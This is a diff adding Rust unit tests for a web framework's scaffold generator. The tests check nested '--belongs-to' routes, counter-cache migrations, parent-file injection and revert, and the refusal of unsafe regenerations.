+            up.contains("ALTER TABLE posts ADD COLUMN comment_count BIGINT NOT NULL DEFAULT 0;"),
+            "the counter column must be NOT NULL with a 0 default (the maintenance \
+             is `c = c + 1`, and NULL + 1 is NULL): {up}"
+        );
+        let down = action_contents(
+            &plan,
+            "migrations/202604280000001_add_comment_count_to_posts/down.sql",
+        );
+        assert!(
+            down.contains("ALTER TABLE posts DROP COLUMN comment_count;"),
+            "{down}"
+        );
+    }
+
+    #[test]
+    fn counter_cache_opts_the_generated_child_model_in() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = counter_cached_comment_plan(&tmp);
+        let model = action_contents(&plan, "src/models/comment.rs");
+        assert!(
+            model.contains("#[belongs_to(Post, counter_cache)]"),
+            "the child model must carry the attribute that drives the maintenance: {model}"
+        );
+    }
+
+    #[test]
+    fn counter_cache_tells_the_author_about_the_parent_side_lines() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = counter_cached_comment_plan(&tmp);
+        let warning = plan
+            .warnings
+            .iter()
+            .find(|w| w.contains("--counter-cache"))
+            .expect("the parent-side lines must be surfaced");
+        assert!(warning.contains("comment_count -> Int8,"), "{warning}");
+        assert!(warning.contains("pub comment_count: i64,"), "{warning}");
+    }
+
+    #[test]
+    fn counter_cache_without_belongs_to_is_refused() {
+        let tmp = project_with_scaffolded_parent();
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &ScaffoldOptions {
+                counter_cache: true,
+                ..ScaffoldOptions::default()
+            },
+        )
+        .expect_err("--counter-cache alone is meaningless");
+        assert!(
+            format!("{err}").contains("--belongs-to"),
+            "the error must name the flag it needs: {err}"
+        );
+    }
+
+    #[test]
+    fn a_plain_belongs_to_scaffold_emits_no_counter_column() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let paths = scaffold_paths(&plan);
+        assert!(
+            !paths
+                .iter()
+                .any(|p| p.contains("add_comment_count_to_posts")),
+            "the flag is opt-in: {paths:?}"
+        );
+    }
+
+    #[test]
+    fn the_counter_migration_is_on_the_revert_plan_too() {
+        // `Plan::revert` discovers removable migration directories from the
+        // plan's `Create` actions under `migrations/`, so a revert plan that
+        // omitted these would leave the counter migration on disk after
+        // `autumn destroy scaffold` — and a later `migrate` run would then add a
+        // column to a parent whose child scaffold is gone.
+        let tmp = project_with_scaffolded_parent();
+        let plan = plan_scaffold_with_options_for_revert(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &counter_cache_options(),
+        )
+        .unwrap();
+        let paths = scaffold_paths(&plan);
+        for side in ["up.sql", "down.sql"] {
+            let wanted = format!("migrations/202604280000001_add_comment_count_to_posts/{side}");
+            assert!(
+                paths.iter().any(|p| p == &wanted),
+                "the revert plan must carry {wanted}: {paths:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn belongs_to_emits_nested_read_and_create_routes() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(
+            routes.contains("#[get(\"/posts/{post_id}/comments\", name = \"nested_index\")]"),
+            "missing nested read route:\n{routes}"
+        );
+        assert!(
+            routes.contains("#[post(\"/posts/{post_id}/comments\", name = \"nested_create\")]"),
+            "missing nested create route:\n{routes}"
+        );
+        assert!(
+            routes.contains("pub async fn nested_index("),
+            "missing nested_index handler:\n{routes}"
+        );
+        assert!(
+            routes.contains("pub async fn nested_create("),
+            "missing nested_create handler:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_nested_list_filters_to_the_parent_and_paginates() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(
+            routes.contains(".filter(comments::post_id.eq(post_id))"),
+            "the child list must be scoped to the parent FK:\n{routes}"
+        );
+        // Paginated through the shipped `PageRequest`/`Page` primitives.
+        assert!(routes.contains("page_req: PageRequest"), "{routes}");
+        assert!(routes.contains(".limit(page_req.limit())"), "{routes}");
+        assert!(routes.contains(".offset(page_req.offset())"), "{routes}");
+        assert!(
+            routes.contains("let page_data: Page<Comment> = Page::new(items, total, page_req);"),
+            "{routes}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_nested_create_takes_the_fk_from_the_path_not_the_body() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        let create = routes
+            .split("pub async fn nested_create(")
+            .nth(1)
+            .expect("nested_create handler");
+        let overwrite = create
+            .find("form.post_id = post_id.to_string();")
+            .expect("nested_create must overwrite the FK from the path");
+        let changeset = create
+            .find("form.into_changeset()")
+            .expect("nested_create must build a changeset");
+        assert!(
+            overwrite < changeset,
+            "the path FK must be applied BEFORE validation so a body-supplied \
+             post_id can never re-parent the child:\n{create}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_nested_create_is_secured_and_redirects_to_the_parent_show() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        let create = routes
+            .split("/// `POST /posts/{post_id}/comments`")
+            .nth(1)
+            .expect("nested_create doc comment");
+        assert!(
+            create.starts_with(" — create one comment under its parent post.\n#[secured]\n"),
+            "the nested mutation must carry #[secured] like the flat create:\n{create}"
+        );
+        assert!(
+            create.contains(
+                "Ok(autumn_web::Redirect::to(&crate::routes::posts::paths::show(*post_id)).into_response())"
+            ),
+            "PRG must redirect to the parent show:\n{create}"
+        );
+        assert!(
+            create.contains("UNPROCESSABLE_ENTITY"),
+            "an invalid submission must re-render at 422 with inline errors:\n{create}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_hides_the_parent_fk_from_the_nested_form() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(
+            routes.contains("exclude_parent_fk: bool"),
+            "the shared form helper must accept the nested-form exclusion flag:\n{routes}"
+        );
+        assert!(
+            routes.contains("form = form.exclude(\"post_id\");"),
+            "the nested form must drop the parent FK control:\n{routes}"
+        );
+        // The child's OWN create/edit forms keep the parent select (#1146).
+        assert!(
+            routes.contains("paths::create(), \"Create\", csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref(), &post_id_options, false)"),
+            "the flat create form must keep the parent select:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_child_show_links_back_to_its_parent() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(
+            routes.contains(
+                "(autumn_web::a11y::Link::new(crate::routes::posts::paths::show(row.post_id), \"Back to Post\"))"
+            ),
+            "the child show view must link back to its parent:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_child_rows_link_to_the_child_show_view() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        let section = routes
+            .split("async fn children_section_with(")
+            .nth(1)
+            .expect("children_section_with helper");
+        assert!(
+            section.contains("autumn_web::a11y::Link::new(paths::show(row.id), \"Show\")"),
+            "each child row must link to the child's own show view:\n{section}"
+        );
+        // The list reuses the shipped data_table widget.
+        assert!(
+            section.contains("autumn_web::widgets::data_table("),
+            "{section}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_patches_the_parent_show_view_with_children_and_inline_form() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let parent = action_contents(&plan, "src/routes/posts.rs");
+        assert!(
+            parent.contains("crate::routes::comments::children_section("),
+            "the parent show must render its children section:\n{parent}"
+        );
+        assert!(
+            parent.contains("(__autumn_children_comments) // autumn:nested:comments"),
+            "the children section must be rendered inside the parent's markup:\n{parent}"
+        );
+        // Rendered above the "Back to list" furniture, i.e. inside the show body.
+        let render_at = parent
+            .find("(__autumn_children_comments) // autumn:nested:comments")
+            .unwrap();
+        let back_at = parent
+            .find("(autumn_web::a11y::Link::new(paths::index(), \"Back to list\"))")
+            .unwrap();
+        assert!(render_at < back_at, "{parent}");
+        // The extra extractors the inline form's CSRF/submit-token needs.
+        assert!(
+            parent.contains("__nested_csrf: Option<CsrfToken>"),
+            "the parent show needs CSRF extractors for the inline create form:\n{parent}"
+        );
+        assert!(
+            parent.contains("// autumn:nested-extractors"),
+            "the signature edit must be marked for destroy:\n{parent}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_parent_injection_is_idempotent() {
+        let tmp = project_with_scaffolded_parent();
+        let first = nested_comment_plan(&tmp);
+        first.execute(Flags::default()).unwrap();
+        let after_first = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+
+        let second = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap();
+        second
+            .execute(Flags {
+                force: true,
+                ..Flags::default()
+            })
+            .unwrap();
+        let after_second = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert_eq!(
+            after_first, after_second,
+            "re-running the generator must not double-inject the parent-side section"
+        );
+        assert_eq!(
+            after_second.matches("// autumn:nested:comments").count(),
+            2,
+            "exactly one binding line + one render line:\n{after_second}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_destroy_restores_the_parent_routes_file() {
+        temp_env::with_vars(
+            [
+                ("AUTUMN_DATABASE__PRIMARY_URL", None::<&str>),
+                ("AUTUMN_DATABASE__URL", None::<&str>),
+                ("DATABASE_URL", None::<&str>),
+            ],
+            || {
+                let tmp = project_with_scaffolded_parent();
+                let parent_path = tmp.path().join("src/routes/posts.rs");
+                let original = fs::read_to_string(&parent_path).unwrap();
+
+                let plan = nested_comment_plan(&tmp);
+                plan.execute(Flags::default()).unwrap();
+                assert_ne!(fs::read_to_string(&parent_path).unwrap(), original);
+
+                let revert = plan_scaffold_with_options_for_revert(
+                    tmp.path(),
+                    "Comment",
+                    &["body:Text".into(), "post:references".into()],
+                    "20260428000000",
+                    &belongs_to_options(),
+                )
+                .unwrap();
+                revert.revert(Flags::default()).unwrap();
+                assert_eq!(
+                    fs::read_to_string(&parent_path).unwrap(),
+                    original,
+                    "destroy must cleanly reverse the parent-side edits"
+                );
+            },
+        );
+    }
+
+    #[test]
+    fn belongs_to_registers_the_nested_routes_in_main() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let main = action_contents(&plan, "src/main.rs");
+        assert!(main.contains("routes::comments::nested_index"), "{main}");
+        assert!(main.contains("routes::comments::nested_create"), "{main}");
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(routes.contains("    nested_index,\n"), "{routes}");
+        assert!(routes.contains("    nested_create,\n"), "{routes}");
+    }
+
+    #[test]
+    fn belongs_to_generated_test_asserts_cross_parent_isolation() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let test = action_contents(&plan, "tests/comment.rs");
+        assert!(
+            test.contains("async fn comments_nested_under_parent()"),
+            "missing the generated nested write-path test:\n{test}"
+        );
+        assert!(
+            test.contains("a child must not appear under a different parent"),
+            "the test must assert the child is absent under a different parent:\n{test}"
+        );
+        // create child under parent → appears under that parent …
+        assert!(test.contains("/posts/1/comments"), "{test}");
+        // … and does NOT appear under a different parent.
+        assert!(test.contains("/posts/2/comments"), "{test}");
+    }
+
+    #[test]
+    fn belongs_to_marks_the_fk_form_field_serde_default() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(
+            routes.contains("    #[serde(default)]\n    pub post_id: String,"),
+            "the nested form omits the FK control, so its decode must tolerate \
+             an absent field:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_requires_a_matching_references_field() {
+        let tmp = project_with_scaffolded_parent();
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into()],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("post:references"), "got: {msg}");
+    }
+
+    #[test]
+    fn belongs_to_requires_the_parent_to_be_scaffolded_first() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("src/routes/posts.rs"), "got: {msg}");
+    }
+
+    #[test]
+    fn belongs_to_is_refused_for_unsupported_scaffold_variants() {
+        for (label, mutate) in [
+            (
+                "--api",
+                (|o: &mut ScaffoldOptions| o.api = true) as fn(&mut ScaffoldOptions),
+            ),
+            ("--live", |o: &mut ScaffoldOptions| o.live = true),
+            ("--live-validation", |o: &mut ScaffoldOptions| {
+                o.live_validation = true;
+            }),
+            ("--sharded", |o: &mut ScaffoldOptions| {
+                o.model.sharded = true;
+            }),
+        ] {
+            let tmp = project_with_scaffolded_parent();
+            let mut options = belongs_to_options();
+            mutate(&mut options);
+            let err = plan_scaffold_with_options(
+                tmp.path(),
+                "Comment",
+                &["body:Text".into(), "post:references".into()],
+                "20260428000000",
+                &options,
+            )
+            .unwrap_err();
+            let msg = format!("{err}");
+            assert!(
+                msg.contains("--belongs-to") && msg.contains(label),
+                "{label} must be refused with an actionable message; got: {msg}"
+            );
+        }
+    }
+
+    #[test]
+    fn belongs_to_composes_with_the_other_form_helper_flags() {
+        // The shared `{snake}_form_for` helper grows one extra parameter per
+        // opt-in feature, and every call site must pass them in DECLARATION
+        // order. `lock_version` (#1318) and `exclude_parent_fk` (#1323) are both
+        // trailing flags, so getting the order wrong compiles the generator but
+        // emits a child module that does not — exactly the break this pins.
+        let tmp = project_with_scaffolded_parent();
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &[
+                "body:Text".into(),
+                "post:references".into(),
+                "lock_version:i32".into(),
+            ],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        let decl = routes
+            .find("    lock_version: Option<i32>,\n    exclude_parent_fk: bool,")
+            .unwrap_or_else(|| {
+                panic!("helper params must be declared lock_version-then-exclude:\n{routes}")
+            });
+        assert!(decl > 0);
+        // The nested call passes them in the same order: no version, hide the FK.
+        assert!(
+            routes.contains("submit_field, &[], None, true)"),
+            "the nested form call must match the declaration order:\n{routes}"
+        );
+        // …and the flat create call: no version, keep the FK select.
+        assert!(
+            routes.contains("submit_field.as_ref(), &post_id_options, None, false)"),
+            "the flat create call must match the declaration order:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_scopes_the_nested_list_like_the_flat_index() {
+        // A child with an owner column gets an owner-scoped, `#[secured]` flat
+        // index. The nested list is a SECOND listing surface onto the same rows,
+        // so it must carry the same scoping — otherwise `--belongs-to` would
+        // quietly open an unauthenticated door onto other users' children.
+        let tmp = project_with_scaffolded_parent();
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &[
+                "body:Text".into(),
+                "post:references".into(),
+                "user_id:i64".into(),
+            ],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(
+            routes.contains(".filter(comments::user_id.eq(owner_id))"),
+            "the nested list must be owner-scoped:\n{routes}"
+        );
+        assert!(
+            routes.contains(
+                "#[secured]\n#[get(\"/posts/{post_id}/comments\", name = \"nested_index\")]"
+            ),
+            "the nested page must be secured like the flat index:\n{routes}"
+        );
+        // A scaffold with NO owner column keeps the unscoped list and no
+        // `#[secured]` — matching its own flat index.
+        let plan = nested_comment_plan(&project_with_scaffolded_parent());
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(!routes.contains("owner_id"), "{routes}");
+        assert!(
+            routes.contains("\n#[get(\"/posts/{post_id}/comments\", name = \"nested_index\")]"),
+            "{routes}"
+        );
+    }
+
+    #[test]
+    fn belongs_to_refuses_a_sharded_parent() {
+        // The child's own `--sharded` is refused elsewhere; this is the other
+        // side of the relationship, which the child's flags cannot see. A
+        // sharded parent holds a `ShardedDb`, which will not coerce to the
+        // `&mut Db` the injected `children_section` call borrows.
+        let tmp = project_with_main(default_main());
+        let parent = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                model: ModelOptions {
+                    sharded: true,
+                    ..ModelOptions::default()
+                },
+                ..ScaffoldOptions::default()
+            },
+        )
+        .unwrap();
+        parent.execute(Flags::default()).unwrap();
+
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("ShardedDb"), "got: {msg}");
+    }
+
+    #[test]
+    fn belongs_to_nested_list_headers_are_not_advertised_as_sortable() {
+        // The nested list runs a fixed `ORDER BY id DESC` and extracts no
+        // `ListQuery`, so a sortable header would render a link that reloads the
+        // identical list and an `aria-sort` that never changes.
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        let section = routes
+            .split("async fn children_section_with(")
+            .nth(1)
+            .expect("children_section_with helper");
+        let section = section.split("async fn nested_view(").next().unwrap();
+        assert!(
+            !section.contains(".sortable("),
+            "the nested columns must not advertise sorting the handler cannot do:\n{section}"
+        );
+        // The flat index still sorts.
+        assert!(routes.contains(".sortable(\"body\")"), "{routes}");
+    }
+
+    #[test]
+    fn belongs_to_nested_routes_404_on_a_parent_that_does_not_exist() {
+        // A path id is untrusted. Without a probe, `GET /posts/999/comments`
+        // renders a plausible-looking empty list + form, and submitting that
+        // form surfaces the foreign-key violation as a 500 instead of a 404.
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(
+            routes.contains("async fn require_post(db: &mut Db, post_id: i64)"),
+            "missing the parent-existence probe:\n{routes}"
+        );
+        assert!(
+            routes.contains(".map_err(AutumnError::not_found)?"),
+            "the probe must 404, not 500:\n{routes}"
+        );
+        // Both untrusted-path entry points run it: the page wrapper (which
+        // backs `nested_index` AND the 422 re-render) and the create's insert.
+        let view = routes
+            .split("async fn nested_view(")
+            .nth(1)
+            .expect("nested_view helper");
+        assert!(view.contains("require_post(db, post_id).await?;"), "{view}");
+        let create = routes
+            .split("pub async fn nested_create(")
+            .nth(1)
+            .expect("nested_create handler");
+        let probe = create
+            .find("require_post(&mut db, *post_id).await?;")
+            .expect("nested_create must probe the parent");
+        let insert = create
+            .find("diesel::insert_into(comments::table)")
+            .expect("nested_create must insert");
+        assert!(
+            probe < insert,
+            "the probe must run BEFORE the insert:\n{create}"
+        );
+    }
+
+    #[test]
+    fn destroy_unmounts_nested_routes_even_without_the_belongs_to_flag() {
+        // `--belongs-to` is something the author typed once, days ago. Omitting
+        // it on `destroy` must not leave `main.rs` mounting handlers whose
+        // module this destroy just deleted — an uncompilable project.
+        temp_env::with_vars(
+            [
+                ("AUTUMN_DATABASE__PRIMARY_URL", None::<&str>),
+                ("AUTUMN_DATABASE__URL", None::<&str>),
+                ("DATABASE_URL", None::<&str>),
+            ],
+            || {
+                let tmp = project_with_scaffolded_parent();
+                nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
+                let main_path = tmp.path().join("src/main.rs");
+                assert!(
+                    fs::read_to_string(&main_path)
+                        .unwrap()
+                        .contains("routes::comments::nested_index")
+                );
+
+                // Recompute the plan WITHOUT `--belongs-to`, exactly as a
+                // forgetful `autumn destroy scaffold Comment …` would.
+                let revert = plan_scaffold_with_options_for_revert(
+                    tmp.path(),
+                    "Comment",
+                    &["body:Text".into(), "post:references".into()],
+                    "20260428000000",
+                    &ScaffoldOptions::default(),
+                )
+                .unwrap();
+                revert
+                    .revert(Flags {
+                        force: true,
+                        ..Flags::default()
+                    })
+                    .unwrap();
+
+                let main = fs::read_to_string(&main_path).unwrap();
+                assert!(!main.contains("nested_index"), "{main}");
+                assert!(!main.contains("nested_create"), "{main}");
+                let parent = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+                assert!(!parent.contains("children_section"), "{parent}");
+                assert!(!parent.contains("autumn:nested"), "{parent}");
+            },
+        );
+    }
+
+    #[test]
+    fn regenerating_without_the_flag_keeps_an_existing_nesting_intact() {
+        // `--belongs-to` is typed once. A later `generate … --force` (the
+        // ordinary "I changed a field" move) rarely repeats it — and the three
+        // artefacts must not disagree: the child module, the `main.rs` mounts,
+        // and the parent's `children_section` call.
+        let tmp = project_with_scaffolded_parent();
+        nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
+
+        let regen = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap();
+
+        let routes = action_contents(&regen, "src/routes/comments.rs");
+        assert!(
+            routes.contains("pub async fn nested_index("),
+            "the regenerated module must keep its nested handlers:\n{routes}"
+        );
+        let main = action_contents(&regen, "src/main.rs");
+        assert!(main.contains("routes::comments::nested_index"), "{main}");
+        assert!(main.contains("routes::comments::nested_create"), "{main}");
+        // The inference is surfaced, never silent.
+        assert!(
+            regen
+                .warnings
+                .iter()
+                .any(|w| w.contains("still nests comments") && w.contains("--belongs-to Post")),
+            "expected a warning naming the recovered parent; got: {:?}",
+            regen.warnings
+        );
+    }
+
+    #[test]
+    fn regenerating_after_dropping_the_foreign_key_is_refused_before_anything_is_written() {
+        // Nothing to nest on any more, so there is no relationship to recover —
+        // and the parent's `children_section` call would be left pointing at a
+        // helper the regenerated module no longer defines. A warning is not
+        // enough: the command would report success on an app that no longer
+        // compiles. Refuse instead, having written nothing.
+        let tmp = project_with_scaffolded_parent();
+        nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
+        let parent_before = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into()],
+            "20260428000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("already nested under posts"), "got: {msg}");
+        assert!(msg.contains("Nothing has been written"), "got: {msg}");
+        assert!(msg.contains("no longer compile"), "got: {msg}");
+        assert_eq!(
+            fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap(),
+            parent_before,
+            "a refusal must not touch the parent"
+        );
+    }
+
+    #[test]
+    fn re_parenting_an_already_nested_resource_is_refused() {
+        // The nastiest shape: it COMPILES. `posts.rs` keeps calling
+        // `children_section(&mut db, row.id, …)`, but the regenerated helper now
+        // filters on `user_id` — so Post #3's page would list User #3's comments
+        // and its inline form would create rows owned by that user.
+        let tmp = project_with_scaffolded_parent();
+        // A second scaffolded parent to re-point at.
+        plan_scaffold(
+            tmp.path(),
+            "User",
+            &["name:String".into()],
+            "20260427000001",
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &[
+                "body:Text".into(),
+                "post:references".into(),
+                "user:references".into(),
+            ],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &[
+                "body:Text".into(),
+                "post:references".into(),
+                "user:references".into(),
+            ],
+            "20260428000000",
+            &ScaffoldOptions {
+                belongs_to: Some("User".to_owned()),
+                ..ScaffoldOptions::default()
+            },
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("already nested under posts"), "got: {msg}");
+        assert!(
+            msg.contains("binds comments to users instead"),
+            "got: {msg}"
+        );
+        assert!(
+            msg.contains("quietly serves the wrong rows"),
+            "the message must name the failure mode — this shape COMPILES:\n{msg}"
+        );
+    }
+
+    #[test]
+    fn regenerating_the_parent_keeps_the_children_section_it_carries() {
+        // `Post` is not a child, so its plan has no `Nesting` and the flat
+        // template it re-renders knows nothing about comments. Without the
+        // re-apply, a `--force` on the parent would silently drop the children
+        // list and the markers — after which a later child regeneration, having
+        // no markers to read, would emit no nested handlers while `main.rs`
+        // still mounted them.
+        let tmp = project_with_scaffolded_parent();
+        nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
+
+        let regen = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        let parent = action_contents(&regen, "src/routes/posts.rs");
+        assert!(
+            parent.contains("// autumn:nested:comments"),
+            "the markers are the only durable record of the relationship:\n{parent}"
+        );
+        assert!(
+            parent.contains("crate::routes::comments::children_section("),
+            "{parent}"
+        );
+        assert!(parent.contains("(__autumn_children_comments)"), "{parent}");
+    }
+
+    #[test]
+    fn destroying_a_parent_that_still_has_nested_children_is_refused() {
+        // Deleting posts.rs and schema::posts out from under comments.rs — which
+        // imports both — leaves the project uncompilable with the nested routes
+        // still mounted. The plain divergence check stops the default destroy by
+        // accident, but says nothing about children and `--force` waves it
+        // through, so refuse explicitly.
+        let tmp = project_with_scaffolded_parent();
+        nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
+
+        let err = plan_scaffold_with_options_for_revert(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("comments is nested under posts"), "got: {msg}");
+        assert!(msg.contains("Destroy comments first"), "got: {msg}");
+        assert!(msg.contains("crate::routes::posts::paths"), "got: {msg}");
+
+        // …and the child's own destroy is unaffected: it is the operation the
+        // refusal points at, so it must not refuse itself.
+        plan_scaffold_with_options_for_revert(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &ScaffoldOptions::default(),
+        )
+        .expect("destroying the CHILD must still be allowed");
+    }
+
+    #[test]
+    fn regenerating_a_nested_parent_into_an_incompatible_variant_is_refused() {
+        // "The marker landed" is not the test: a `--sharded` parent's `show`
+        // takes the injection perfectly cleanly and then fails to compile,
+        // because `children_section` borrows `&mut Db` and the handler now holds
+        // a `ShardedDb`. The parent's own regeneration runs none of the
+        // preflights `resolve` does for a child, so it checks them here.
+        let tmp = project_with_scaffolded_parent();
+        nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
+        let before = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                model: ModelOptions {
+                    sharded: true,
+                    ..ModelOptions::default()
+                },
+                ..ScaffoldOptions::default()
+            },
+        )
+        .unwrap_err();
+        let msg = format!("{err}");
+        assert!(msg.contains("comments is nested under posts"), "got: {msg}");
+        assert!(msg.contains("Nothing has been written"), "got: {msg}");
+        assert_eq!(
+            fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap(),
+            before,
+            "a refusal must not touch the parent"
+        );
+    }
+
+    #[test]
+    fn the_injected_show_carries_the_lint_allowance_its_extra_extractors_need() {
+        // A generated project's own CI runs `cargo clippy --all-targets -- -D
+        // warnings`. Every standard `show` already takes three parameters, so
+        // six extractors trip `too_many_arguments` (9/7) — `cargo check` passes,
+        // which is why this stayed invisible. The allowance is reversible: it
+        // carries the extractors marker and comes off with them.
+        let tmp = project_with_scaffolded_parent();
+        let plan = nested_comment_plan(&tmp);
+        let parent = action_contents(&plan, "src/routes/posts.rs");
+        let allow = parent
+            .find("#[allow(clippy::too_many_arguments)] // autumn:nested-extractors")
+            .expect("the injected show needs a lint allowance");
+        let sig = parent.find("pub async fn show(").expect("show");
+        assert!(
+            allow < sig,
+            "the allowance must precede the signature:\n{parent}"
+        );
+
+        let reverted = super::super::nested::remove_nested_child_section(&parent, "comments");
+        assert!(
+            !reverted.contains("#[allow(clippy::too_many_arguments)] // autumn:nested"),
+            "the allowance must come off with the extractors:\n{reverted}"
+        );
+    }
+
+    #[test]
+    fn without_belongs_to_the_scaffold_output_is_unchanged() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260428000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/comments.rs");
+        assert!(!routes.contains("nested_index"), "{routes}");
+        assert!(!routes.contains("children_section"), "{routes}");
+        assert!(!routes.contains("exclude_parent_fk"), "{routes}");
+        // The parent's routes file is not touched at all.
+        assert!(
+            !plan
+                .actions
+                .iter()
+                .any(|a| a.path().ends_with("routes/posts.rs")),
+            "a flat scaffold must never patch a sibling resource"
+        );
+    }
+
+    // ── Trash view + restore/purge (issue #1332) ───────────────────────────
+
+    /// A `--soft-delete` `Post` scaffold's options, with `extra` applied on top.
+    fn trash_options(extra: impl FnOnce(&mut ScaffoldOptions)) -> ScaffoldOptions {
+        let mut options = ScaffoldOptions {
+            model: ModelOptions {
+                soft_delete: true,
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        extra(&mut options);
+        options
+    }
+
